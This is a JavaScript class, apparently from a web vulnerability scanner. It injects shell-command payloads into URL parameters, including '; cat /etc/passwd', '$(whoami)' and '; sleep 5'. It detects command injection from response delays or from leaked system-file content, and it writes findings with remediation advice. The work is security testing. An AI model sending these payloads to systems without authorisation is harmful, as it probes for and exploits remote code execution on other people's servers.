import axios from 'axios';

export class CommandInjectionDetector {
  constructor() {
    this.payloads = [
      '; ls -la',
      '| ls -la',
      '&& ls -la',
      '|| ls -la',
      '; cat /etc/passwd',
      '| cat /etc/passwd',
      '&& cat /etc/passwd',
      '; whoami',
      '| whoami',
      '&& whoami',
      '`whoami`',
      '$(whoami)',
      '; sleep 5',
      '| sleep 5',
      '&& sleep 5'
    ];
  }

  async detect(endpoint) {
    const vulnerabilities = [];
    if (!endpoint.parameters) return vulnerabilities;

    for (const param of endpoint.parameters) {
      for (const payload of this.payloads) {
        try {
          const testUrl = this.buildTestUrl(endpoint.url, param, payload);
          const startTime = Date.now();

          const response = await axios.get(testUrl, {
            timeout: 10000,
            validateStatus: () => true
          });

          const responseTime = Date.now() - startTime;

          if (this.isVulnerable(response.data, payload, responseTime)) {
            vulnerabilities.push({
              type: 'COMMAND_INJECTION',
              severity: 'CRITICAL',
              url: testUrl,
              parameter: param,
              payload: payload,
              evidence: response.data.toString().substring(0, 500),
              description: `Command Injection vulnerability in '${param}'`,
              impact: 'Remote code execution, complete system compromise, data theft',
              remediation: 'Never pass user input to system commands. Use API libraries instead of shell commands. Implement strict input validation.',
              cwe: 'CWE-78',
              owasp: 'A03:2021 – Injection',
              reproductionSteps: [
                `1. Navigate to: ${testUrl}`,
                `2. Check response for command output`,
                `3. Look for directory listings, file contents, or command results`
              ],
              curlCommand: `curl -X GET "${testUrl}"`
            });
            break;
          }
        } catch (error) {}
      }
    }
    return vulnerabilities;
  }

  buildTestUrl(baseUrl, param, payload) {
    const url = new URL(baseUrl);
    url.searchParams.set(param, payload);
    return url.toString();
  }

  isVulnerable(data, payload, responseTime) {
    const dataStr = data.toString();

    if (payload.includes('sleep') && responseTime > 4000) {
      return true;
    }

    if (/root:x:0:0|bin\/bash|\/usr\/bin|\/etc\/|drwxr/i.test(dataStr)) {
      return true;
    }

    return false;
  }
}
